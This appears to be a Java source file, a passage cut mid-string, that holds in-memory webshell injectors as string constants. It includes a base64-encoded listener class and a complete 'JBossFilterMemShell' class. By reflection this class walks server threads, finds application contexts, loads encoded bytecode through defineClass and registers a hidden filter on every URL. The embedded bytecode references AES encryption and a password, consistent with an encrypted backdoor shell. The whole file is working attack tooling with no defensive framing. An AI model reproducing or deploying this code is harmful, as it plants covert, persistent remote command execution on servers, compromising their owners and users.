XRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBXgFfDAFgAWEMAWIBYwcBZAwBZQFLDAFmAS0MAI4AjwwBYgE7AQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzDAFnAHABACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEAE2phdmF4L2NyeXB0by9DaXBoZXIBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWdldFN1cGVyY2xhc3MBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACWdldEhlYWRlcgEAB2luZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQALdG9CeXRlQXJyYXkBAA9wcmludFN0YWNrVHJhY2UAIQBMAGMAAQBkAAcAAQBlAGYAAAABAGcAaAAAAAAAaQBqAAAAAQBrAGoAAAABAGwAa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\";\n" +
                    "            byte[] ListenerClass = base64Decode(ListenerBase64);\n" +
                    "\n" +
                    "            Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                    "            defineClass1.setAccessible(true);\n" +
                    "            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);\n" +
                    "\n" +
                    "            EventListener listenerObject = (EventListener) listenerClass.newInstance();\n" +
                    "\n" +
                    "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
                    "            Field f1 = threadGroup.getClass().getDeclaredField(\"threads\");\n" +
                    "            f1.setAccessible(true);\n" +
                    "            Thread[] threads = (Thread[]) f1.get(threadGroup);\n" +
                    "\n" +
                    "            for (Thread thread : threads) {\n" +
                    "                try {\n" +
                    "                    char[] chararray = (char[]) getFV(thread, \"name\");\n" +
                    "                    String chars = String.valueOf(chararray);\n" +
                    "\n" +
                    "                    if (chars.contains(\"ContainerBackgroundProcessor\") && chars.matches(\".*StandardContext\\\\[/.+\\\\]\")) {\n" +
                    "                        Object target = getFV(thread, \"target\");\n" +
                    "                        Object this0 = getFV(target, \"this$0\");\n" +
                    "\n" +
                    "                        Method m2 = this0.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"getApplicationEventListeners\");\n" +
                    "                        m2.setAccessible(true);\n" +
                    "                        List<EventListener> eventlisteners = (List<EventListener>) m2.invoke(this0);\n" +
                    "                        eventlisteners.add(listenerObject);\n" +
                    "                    }\n" +
                    "                } catch (Exception e) {\n" +
                    "                }\n" +
                    "            }\n" +
                    "        } catch (Exception e) {\n" +
                    "\n" +
                    "        }\n" +
                    "    }\n" +
                    "\n" +
                    "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
                    "        Field var2 = null;\n" +
                    "        Class var3 = var0.getClass();\n" +
                    "\n" +
                    "        while (var3 != Object.class) {\n" +
                    "            try {\n" +
                    "                var2 = var3.getDeclaredField(var1);\n" +
                    "                break;\n" +
                    "            } catch (NoSuchFieldException var5) {\n" +
                    "                var3 = var3.getSuperclass();\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "        if (var2 == null) {\n" +
                    "            throw new NoSuchFieldException(var1);\n" +
                    "        } else {\n" +
                    "            var2.setAccessible(true);\n" +
                    "            return var2.get(var0);\n" +
                    "        }\n" +
                    "    }\n" +
                    "\n" +
                    "    public static byte[] base64Decode(String bs) throws Exception {\n" +
                    "        byte[] value = null;\n" +
                    "\n" +
                    "        Class base64;\n" +
                    "        try {\n" +
                    "            base64 = Class.forName(\"java.util.Base64\");\n" +
                    "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
                    "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
                    "        } catch (Exception var6) {\n" +
                    "            try {\n" +
                    "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                    "                Object decoder = base64.newInstance();\n" +
                    "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
                    "            } catch (Exception var5) {\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "        return value;\n" +
                    "    }\n" +
                    "}\n";

    public static final String JBossFilterMemShell =
            "import java.lang.reflect.*;\n" +
            "import java.util.*;\n" +
            "\n" +
            "public class JBossFilterMemShell{\n" +
            "    private static ArrayList StanderContexts = new ArrayList();\n" +
            "    private static String FilterName = \"memshell.JBossFilterShell\";\n" +
            "    public static Object request;\n" +
            "    static{\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "    public JBossFilterMemShell(){\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void Inject(){\n" +
            "        getContext4();\n" +
            "        getContext5And6();\n" +
            "        Iterator var1 = StanderContexts.iterator();\n" +
            "        IMC();\n" +
            "        while (var1.hasNext()) {\n" +
            "            Object var2 = var1.next();\n" +
            "            if (!isInjected(var2)){\n" +
            "                IMF(var2);}\n" +
            "        }\n" +
            "    }\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while (var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getContext4() {\n" +
            "        Object StandardContext = null;\n" +
            "        try {\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Thread[] threads = (Thread[]) getFV(threadGroup, \"threads\");\n" +
            "            for (Thread thread : threads) {\n" +
            "                Object Endpoint = null;\n" +
            "                if (thread.getName().startsWith(\"http-\")) {\n" +
            "                    Object tmp = getFV(thread, \"target\");\n" +
            "                    if (tmp.getClass().getName().contains(\"PoolTcpEndpoint\")) {\n" +
            "                        Endpoint = tmp;\n" +
            "                    } else {\n" +
            "                        try {\n" +
            "                            Endpoint = getFV(tmp, \"endpoint\");\n" +
            "                        } catch (Exception e) {\n" +
            "                            Object toRun = getFV(tmp, \"toRun\");\n" +
            "                            if (toRun != null){\n" +
            "                                Endpoint = getFV(toRun, \"endpoint\");}\n" +
            "                        }\n" +
            "                    }\n" +
            "                    if (Endpoint != null) {\n" +
            "                        Object Http11Protocol = getFV(Endpoint, \"handler\");\n" +
            "                        Object RequestGroupInof = getFV(Http11Protocol, \"global\");\n" +
            "                        List Processors = (List) getFV(RequestGroupInof, \"processors\");\n" +
            "                        for (int i = 0; i < Processors.size(); i++) {\n" +
            "                            Object RequestInfo = (Object) Processors.get(i);\n" +
            "                            Object Request = getFV(RequestInfo, \"req\");\n" +
            "                            Object Request1 = Request.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(Request, 1);\n" +
            "                            Field f4 = Request1.getClass().getDeclaredField(\"context\");\n" +
            "                            f4.setAccessible(true);\n" +
            "                            StandardContext = f4.get(Request1);\n" +
            "                            if (StandardContext != null) {\n" +
            "                                request = Request;\n" +
            "                                StanderContexts.add(StandardContext);\n" +
            "                                break;\n" +
            "                            }\n" +
            "                        }\n" +
            "                    }}\n" +
            "            }\n" +
            "\n" +
            "        }catch(Exception e){}\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getContext5And6() {\n" +
            "        Object StandardContext = null;\n" +
            "        try {\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Thread[] threads = (Thread[]) getFV(threadGroup, \"threads\");\n" +
            "            for (Thread thread : threads) {\n" +
            "                if (thread.getName().contains(\"Acceptor\") && thread.getName().contains(\"http\")) {\n" +
            "                    Object JioEndpoint$ = getFV(thread, \"target\");\n" +
            "                    Object JioEndpointO = getFV(JioEndpoint$, \"this$0\");\n" +
            "                    Object Http11Protocol = getFV(JioEndpointO, \"handler\");\n" +
            "                    Object RequestGroupInof = getFV(Http11Protocol, \"global\");\n" +
            "                    List Processors = (List) getFV(RequestGroupInof, \"processors\");\n" +
            "                    for (int i = 0; i < Processors.size(); i++) {\n" +
            "                        Object RequestInfo = (Object) Processors.get(i);\n" +
            "                        Object Request = getFV(RequestInfo, \"req\");\n" +
            "                        Object Request1 = Request.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(Request, 1);\n" +
            "                        Field f4 = Request1.getClass().getDeclaredField(\"context\");\n" +
            "                        f4.setAccessible(true);\n" +
            "                        StandardContext = f4.get(Request1);\n" +
            "                        if (StandardContext != null) {\n" +
            "                            request = Request;\n" +
            "                            StanderContexts.add(StandardContext);\n" +
            "                            break;\n" +
            "                        }\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized boolean isInjected(Object STANDARD_CONTEXT) {\n" +
            "        try {\n" +
            "            Map map = (Map) getFV(STANDARD_CONTEXT, \"filterDefs\");\n" +
            "            Set set = map.keySet();\n" +
            "            Iterator it = set.iterator();\n" +
            "            while (it.hasNext()){\n" +
            "                Object o = it.next();\n" +
            "                if (o.toString().contains(FilterName)){\n" +
            "                    return true;\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return false;\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized void IMF(Object STANDARD_CONTEXT) {\n" +
            "        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "\n" +
            "\n" +
            "        try {\n" +
            "            Object filter = (Object) Thread.currentThread().getContextClassLoader().loadClass(FilterName).newInstance();\n" +
            "            Class<?> FilterDefClass = null;\n" +
            "            Class<?> Context = null;\n" +
            "            try {\n" +
            "                Context = classLoader.loadClass(\"org.apache.catalina.Context\"); //\n" +
            "            } catch (Exception e) {\n" +
            "            }\n" +
            "            try {\n" +
            "                FilterDefClass = classLoader.loadClass(\"org.apache.catalina.deploy.FilterDef\");\n" +
            "            } catch (Exception e) {\n" +
            "            }\n" +
            "\n" +
            "            Constructor FilterDefCons = FilterDefClass.getDeclaredConstructor();\n" +
            "            FilterDefCons.setAccessible(true);\n" +
            "            Object filterDef = FilterDefCons.newInstance();\n" +
            "            invoke(filterDef, \"setFilterName\", FilterName);\n" +
            "            invoke(filterDef, \"setFilterClass\", filter.getClass().getName());\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterDef\", filterDef);\n" +
            "\n" +
            "            Class<?> filterMapClass = null;\n" +
            "            try {\n" +
            "                filterMapClass = classLoader.loadClass(\"org.apache.catalina.deploy.FilterMap\");\n" +
            "            } catch (Exception e) {\n" +
            "\n" +
            "            }\n" +
            "            Constructor FilterMapCons = filterMapClass.getDeclaredConstructor();\n" +
            "            FilterMapCons.setAccessible(true);\n" +
            "            Object FilterMapObj = FilterMapCons.newInstance();\n" +
            "            invoke(FilterMapObj, \"addURLPattern\", \"/*\");  // version 6\n" +
            "            invoke(FilterMapObj, \"setURLPattern\", \"/*\"); // version 4\n" +
            "            invoke(FilterMapObj, \"setFilterName\", FilterName);\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterMap\", FilterMapObj);\n" +
            "\n" +
            "            Class<?> ApplicationFilterConfigClass = classLoader.loadClass(\"org.apache.catalina.core.ApplicationFilterConfig\");\n" +
            "            Constructor ApplicationFilterCons = ApplicationFilterConfigClass.getDeclaredConstructor(Context, FilterDefClass);\n" +
            "            ApplicationFilterCons.setAccessible(true);\n" +
            "            Object ApplicationfilterObj = ApplicationFilterCons.newInstance(STANDARD_CONTEXT, filterDef);\n" +
            "\n" +
            "            Field getAppFilterConfigs = STANDARD_CONTEXT.getClass().getDeclaredField(\"filterConfigs\");\n" +
            "            getAppFilterConfigs.setAccessible(true);\n" +
            "            Map filterConfigs = (Map) getAppFilterConfigs.get(STANDARD_CONTEXT);\n" +
            "            filterConfigs.put(FilterName, ApplicationfilterObj);\n" +
            "\n" +
            "        } catch (Throwable var16) {\n" +
            "\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private static Method getMethodByClass(Class cs, String methodName, Class... parameters) {\n" +
            "        Method method = null;\n" +
            "\n" +
            "        while (cs != null) {\n" +
            "            try {\n" +
            "                method = cs.getDeclaredMethod(methodName, parameters);\n" +
            "                cs = null;\n" +
            "            } catch (Exception var6) {\n" +
            "                cs = cs.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return method;\n" +
            "    }\n" +
            "\n" +
            "    private static Object invoke(Object obj, String methodName, Object... parameters) {\n" +
            "        try {\n" +
            "            ArrayList classes = new ArrayList();\n" +
            "            if (parameters != null) {\n" +
            "                for (int i = 0; i < parameters.length; ++i) {\n" +
            "                    Object o1 = parameters[i];\n" +
            "                    if (o1 != null) {\n" +
            "                        classes.add(o1.getClass());\n" +
            "                    } else {\n" +
            "                        classes.add((Object) null);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));\n" +
            "            return method.invoke(obj, parameters);\n" +
            "        } catch (Exception var7) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMC() {\n" +
            "        try {\n" +
            "            Thread.currentThread().getContextClassLoader().loadClass(FilterName);\n" +
            "        } catch (Exception var4) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "//                byte[] var2 = base64Decode(\"yv66vgAAADIBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAbTG1lbXNoZWxsL0pCb3NzRmlsdGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDxBwEGBwDFAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA3AEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBBwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBCAcBCQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAVSkJvc3NGaWx0ZXJTaGVsbC5qYXZhDABmAGcMAFwAXQwAXgBfAQAQM2M2ZTBiOGE5YzE1MjI0YQwAYABhAQAEcEFTMwwAYgBhAQAQL2Zhdmljb25kZW1vLmljbwwAYwBhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQoBCwwBDAENDABkAIEMAGQAYQEABVVURi04DABlAGEMAGYAbQwBDgEPAQADQUVTBwEGDAEQAREBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAESARMMAGYBFAwAkgEVDAEWARcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEYDAEQARkMARoBGwwBHAEdAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAR4BEwwAZgEfDAEMASAMASEBDQEAEGphdmEudXRpbC5CYXNlNjQMASIBIwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMASQBJQEAE1tMamF2YS9sYW5nL09iamVjdDsHASYMAScBKAwBKQEqAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY